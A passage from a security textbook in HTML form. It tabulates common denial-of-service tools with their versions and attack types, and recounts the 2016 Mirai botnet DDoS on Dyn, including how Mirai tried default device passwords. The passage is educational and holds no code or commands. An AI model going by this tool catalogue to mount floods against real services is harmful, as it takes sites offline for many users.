<span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section220" ><table class=MsoNormalTable  border=1  cellspacing=0  style="border-collapse:collapse;width:467.2500pt;margin-left:14.4000pt;mso-table-layout-alt:fixed;border:none;mso-border-left-alt:0.7500pt solid rgb(191,191,191);mso-border-top-alt:0.7500pt solid rgb(191,191,191);mso-border-right-alt:0.7500pt solid rgb(191,191,191);mso-border-bottom-alt:0.7500pt solid rgb(191,191,191);mso-border-insideh:0.7500pt solid rgb(191,191,191);mso-border-insidev:0.7500pt solid rgb(191,191,191);mso-padding-alt:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;" ><tr style="height:36.6000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:0.7500pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-left:2.6000pt;line-height:16.6000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >LOIC</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="line-height:16.6000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >1.1.2.0b</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-right:28.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >TCP, UDP, HTTP, ReCoil, slow LOIC</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Longcat</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >2.3</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >TCP, UDP, HTTP</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >SimpleDoSTool</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >0</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >TCP</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Slowloris</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >0.7</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >HTTP</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Syn Flood DOS</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >0</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >SYN</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >TORSHAMMER</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >1.0b</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >HTTP</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >UnknownDoser</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >1.1.0.2</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >HTTP GET, HTTP POST</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >XOIC</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >1.3</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Normal (=TCP), TCP, UDP, ICMP</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr></table><p class=MsoBodyText  style="margin-top:8.3500pt;margin-right:7.4000pt;" ><span style="position:absolute;z-index:-1;margin-left:128.7500px;margin-top:170.5833px;width:763.0000px;height:584.0000px;" ><img width="763"  height="584"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker284293.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Reference: Data for </span><span><a href="#_bookmark430" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Table 5-2</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >came mostly from a 2014 study, &#8220;Traffic Characteristics of Common DoS Tools&#8221; by V&#237;t Buka&#269;, then a researcher for Masaryk University in Brno, Czech Republic. You can read this entire highly informative report at </span><span><a href="http://www.fi.muni.cz/reports/files/2014/FIMU-RS-2014-02.pdf" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >http://www.fi.muni.cz/reports/files/2014/FIMU-RS-2014-02.pdf</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. `</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:23.5000pt;" ><o:p>&nbsp;</o:p></span></p><h1 style="margin-top:0.0000pt;margin-left:20.0000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" >OCTOBER 21, 2016 DDOS ON DYN</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></h1><p class=MsoBodyText  style="margin-top:20.8000pt;margin-right:17.2500pt;margin-left:20.0000pt;" ><a name="_bookmark431" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Many DoS attacks, or attempted attacks, occur without much fanfare (outside the industry). Occasionally, however, an attack grabs the media spotlight. One example was on October 21, 2016, when the company Dyn saw its Managed DNS infrastructure become the target of a DDoS attack.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:17.2500pt;margin-left:20.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The impact of that DDoS was massive. Many top tier websites experienced outages, primarily those browsing on the east coast of North America, affecting millions of people. While Dyn might not be a household name, many companies whose services went dark are: Twitter, Reddit, CNN, PayPal, Spotify, GitHub, Etsy, Xbox, BBC, and even Cleveland.com.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:21.0000pt;margin-left:20.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The attack lasted the greater part of the day. Those investigating the attack estimated the malicious traffic to be in the tens of millions of IP addresses! By evening, Dyn had summarized it as a &#8220;very sophisticated and complex attack.&#8221;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section221" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:17.2500pt;margin-left:20.0000pt;" ><span style="position:absolute;z-index:-1;margin-left:128.7500px;margin-top:119.9167px;width:763.0000px;height:1082.0000px;" ><img width="763"  height="1082"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker285605.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This sidebar comes with considerable coincidence (irony?). I was writing this chapter&#8217;s coverage of DoS attacks on October 21, the day of the attack. As I heard about the outages, I immediately wondered out loud &#8220;Maybe there&#8217;s some big DNS DDoS going on?&#8221; As you know, the Domain Name System (DNS) is how networks resolve domain names to routable IP addresses. When you hear of several websites experiencing trouble at once, it&#8217;s easy to suspect DNS troubles, rather than attacks on several web hosting servers directly. Lo and behold, confirmation came soon enough.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:23.1500pt;margin-left:20.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The source code behind the attack is Mirai, malware that targets Linux devices and adds them to a botnet. The botnet listens and waits for commands from a command and control server, which issues instructions to strike at, for example, DNS servers. Botnet- building software can vary how it exploits devices, but Mirai in particular does so by trying from a list of default passwords. Sadly, the list is short but very effective. The October 21, 2016 attack primarily came from webcams and other smart devices, a pool of Internet-connected stuff coined the Internet of Things. The main lesson is strength in numbers. It doesn&#8217;t take a few powerful devices to wage a DoS; it takes a lot of little things.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9000pt;margin-right:21.2500pt;margin-left:20.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >With source code on GitHub, Mirai will be studied for good and bad research and invariably be used again and again.<a name="_bookmark432" ></a>&nbsp;</span><span><a href="#_bookmark433" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-17</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is source code from the Mirai </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >scanner.c </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >file containing some of the passwords. If users took the time to change passwords more often, or if manufacturers didn&#8217;t hardcode them, this password list would be useless.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section222" ><p class=MsoBodyText  style="margin-left:13.2500pt;" ><span><span style="position:absolute;z-index:1;margin-left:0.0000px;margin-top:0.0000px;width:763.0000px;height:515.0000px;" ><img width="763"  height="515"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker287276.png" ></span></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><h4 style="margin-top:4.5500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Less Is Sometimes More</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:10.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Rather than slamming a network interface with traffic, there are less 